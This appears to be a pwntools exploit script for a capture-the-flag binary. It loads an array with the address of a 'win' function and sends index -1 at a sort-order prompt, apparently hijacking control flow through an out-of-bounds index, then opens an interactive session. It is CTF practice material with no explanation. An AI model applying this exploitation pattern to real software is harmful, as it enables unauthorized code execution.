from pwn import *

file = "./chall"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
io = process(file)
#io = remote(HOST, PORT)

def b(s: str) -> bytes:
    return bytes(s, 'utf-8')

def set_elm(e: bytes):
    io.sendlineafter(b"= ", e)

def call(idx: bytes):
    io.sendlineafter(b"[0] Ascending / [1] Descending: ", idx)

set_elm(b"1")
set_elm(b"3")
set_elm(b"2")
set_elm(b"5")
set_elm(b(str(e.sym["win"])))

call(b"-1")

io.interactive()
